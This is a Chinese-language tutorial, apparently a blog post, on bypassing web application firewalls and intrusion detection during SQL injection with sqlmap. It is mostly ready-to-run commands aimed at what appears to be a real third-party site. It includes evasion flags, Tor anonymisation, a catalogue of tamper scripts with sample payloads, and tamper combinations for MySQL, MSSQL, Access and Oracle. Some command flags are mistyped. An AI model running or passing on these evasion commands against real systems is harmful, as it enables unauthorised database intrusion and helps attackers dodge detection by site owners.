0x00 前言
   现在的网络环境往往是WAF/IPS/IDS保护着Web 服务器等等，这种保护措施往往会过滤挡住我们的SQL注入查询链接，甚至封锁我们的主机IP，所以这个时候，我们就要考虑怎样进行绕过，达到注入的目标。因为现在WAF/IPS/IDS都把sqlmap 列入黑名单了，呵呵！但是本文基于sqlmap 进行绕过注入测试，介绍至今仍然实用有效的技巧，以下策略在特定的环境能够成功绕过，具体是否绕过，请仔细查看输出的信息。

0x01 确认WAF
     首先我们判断该Web 服务器是否被WAF/IPS/IDS保护着。这点很容易实现，因为我们在漏扫或者使用专门工具来检测是否有WAF，这个检测，在nmap 的NSE，或者WVS的策略或者APPSCAN的策略中都有，我们可以利用这些来判断。在此我们，也介绍使用sqlmap 进行检测是否有WAF/IPS/IDS

root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --thread 10 --identify-waf#首选

root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --thread 10  --check-waf#备选

0x02 使用参数进行绕过
root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --random-agent -v 2 #使用任意浏览器进行绕过，尤其是在WAF配置不当的时候

root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --hpp -v 3#使用HTTP 参数污染进行绕过，尤其是在ASP.NET/IIS 平台上

root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --delay=3.5 --time-sec=60 #使用长的延时来避免触发WAF的机制，这方式比较耗时

root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --proxy=211.211.211.211:8080 --proxy-cred=211:985#使用代理进行注入

root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --ignore-proxy#禁止使用系统的代理，直接连接进行注入

root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --flush-session#清空会话，重构注入

root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --hex#或者使用参数 --no-cast ，进行字符码转换

root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4"  --mobile #对移动端的服务器进行注入

root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --tor # 匿名注入

0x03 使用脚本介绍
1 使用格式：
root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --tamper=A.py,B.py#脚本A，脚本B 

2 脚本总类
01 apostrophemask.py#用utf8代替引号；Example: ("1 AND '1'='1") '1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'

02 equaltolike.py#MSSQL * SQLite中like 代替等号；Example:  Input: SELECT * FROM users WHERE id=1 ；Output: SELECT * FROM users WHERE id LIKE 1

03 greatest.py#MySQL中绕过过滤’>’ ,用GREATEST替换大于号；Example: ('1 AND A > B') '1 AND GREATEST(A,B+1)=A'

04 space2hash.py#空格替换为#号 随机字符串 以及换行符；Input: 1 AND 9227=9227；Output: 1%23PTTmJopxdWJ%0AAND%23cWfcVRPV%0A9227=9227

05 apostrophenullencode.py#MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号；

06 halfversionedmorekeywords.py#当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论；

07 space2morehash.py#MySQL中空格替换为 #号 以及更多随机字符串 换行符；

08 appendnullbyte.py#Microsoft Access在有效负荷结束位置加载零字节字符编码；Example: ('1 AND 1=1') '1 AND 1=1%00'

09 ifnull2ifisnull.py#MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’

10 space2mssqlblank.py(mssql)#mssql空格替换为其它空符号

11base64encode.py#用base64编码j Example: ("1' AND SLEEP(5)#") 'MScgQU5EIFNMRUVQKDUpIw==' Requirement: all

12 space2mssqlhash.py#mssql查询中替换空格

13 modsecurityversioned.py#(mysql中过滤空格，包含完整的查询版本注释;Example: ('1 AND 2>1--') '1 /*!30874AND 2>1*/--'

14 space2mysqlblank.py#(mysql中空格替换其它空白符号

15 between.py#MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（>）

16 space2mysqldash.py#MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）

17 multiplespaces.py#围绕SQL关键字添加多个空格；Example: ('1 UNION SELECT foobar') '1 UNION SELECT foobar'

18 space2plus.py#用+替换空格；Example: ('SELECT id FROM users') 'SELECT+id+FROM+users'

19 bluecoat.py#MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like

20 nonrecursivereplacement.py#双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如 .replace（“SELECT”、””)） filters

21 space2randomblank.py#代替空格字符（“”）从一个随机的空白字符可选字符的有效集

22 sp_password.py#追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾

23 chardoubleencode.py#双url编码(不处理以编码的)

24 unionalltounion.py#替换UNION ALL SELECT UNION SELECT；Example: ('-1 UNION ALL SELECT') '-1 UNION SELECT'

25 charencode.py#Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码；

26 randomcase.py#Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写

27 unmagicquotes.py#宽字符绕过 GPC addslashes；Example: * Input: 1′ AND 1=1 * Output: 1%bf%27 AND 1=1–%20

28 randomcomments.py#用/**/分割sql关键字；Example:‘INSERT’ becomes ‘IN//S//ERT’

29 charunicodeencode.py#ASP，ASP.NET中字符串 unicode 编码；

30 securesphere.py#追加特制的字符串；Example: ('1 AND 1=1') "1 AND 1=1 and '0having'='0having'"

31 versionedmorekeywords.py#MySQL >= 5.1.13注释绕过

32 space2comment.py#Replaces space character (‘ ‘) with comments ‘/**/’

33 halfversionedmorekeywords.py#MySQL < 5.1中关键字前加注释



0x04脚本参数组合策略绕过
1 mysql绕过：
root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --random-agent -v 2 -delay=3.5 --tamper=space2hash.py,modsecurityversioned.py

root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4" --random-agent --hpp  --tamper=space2mysqldash.p,versionedmorekeywords.py

root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4"  -delay=3.5  ----user-agent=" Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/38.0.696.12 Safari/534.24” --tamper=apostrophemask.py,equaltolike.py

备注：这些组合策略可以根据注入的反馈信息，及时调整组合策略

2 MSSQL：
root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4"  -delay=3.5  ----user-agent=" Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/38.0.696.12 Safari/534.24” --tamper=randomcase.py,charencode.py

root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4"  --delay=3.5 --hpp --tamper=space2comment.py,randomcase.py
root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4"  --delay=3.5 --time-sec=120  --tamper=space2mssqlblank.py,securesphere.py

root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4"  --delay=3.5 --tamper=unionalltounion.py,base64encode.p

3 ms access:
root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4"  --delay=3.5 --random-agent  --tamper=appendnullbyte.py,space2plus.py

root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4"  --delay=3.5 --random-agent --hpp  --tamper=chardoubleencode.py

4 Oracle：
root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4"  --delay=5 --random-agent --hpp --tamper=unmagicquotes.py,unionalltounion.py

root@kali:~# sqlmap -u "http://yiliao.kingdee.com/contents.php?id=51&types=4"  --delay=5--user-agent =“Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0” --hpp --tamper=charunicodeencode.py,chardoubleencode.py

5 建议：
      因为WAF可能采用白名单规则，所以对于选择哪种策略，重点是根据-v 3 提示的信息进行判断，可以抓取主流的浏览器的user-agent ,s适当的延时，加上注入字符转换---大小写、空格、字符串、注释、加密等等方式

      鉴于参数和32种脚本，在我们平时的注入，这些通过不同的多重组合来进行测试，这个测试或者比较耗时